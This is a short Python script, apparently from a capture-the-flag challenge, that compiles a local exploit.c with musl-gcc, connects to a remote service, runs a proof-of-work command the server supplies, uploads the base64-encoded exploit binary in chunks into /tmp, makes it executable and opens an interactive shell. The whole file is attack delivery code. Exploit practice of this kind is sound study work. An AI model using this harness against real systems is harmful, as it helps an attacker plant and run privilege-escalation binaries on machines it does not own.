from ptrlib import *
import base64
import os
import time

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", 9082)

if os.system("musl-gcc exploit.c -o pwn -static") != 0:
    exit(1)
if os.system("strip --strip-all pwn") != 0:
    exit(1)
with open("pwn", "rb") as f:
    data = base64.b64encode(f.read()).decode()

def run(cmd):
    sock.sendlineafter("$ ", cmd)

#sock = Process(["/bin/bash", "./run.sh"], cwd="../distfiles")
sock = Socket(HOST, PORT)

p = Process(sock.recvline().decode().split())
while p.is_alive():
    time.sleep(1)
token = p.recvlineafter("token: ")

sock.sendline(token)

run('cd /tmp')
logger.info("Uploading...")
for block in chunks(data, 1000):
    run(f'echo "{block}" >> b64')
run(f'base64 -d b64 > pwn')
run(f'chmod +x pwn')

sock.sh()
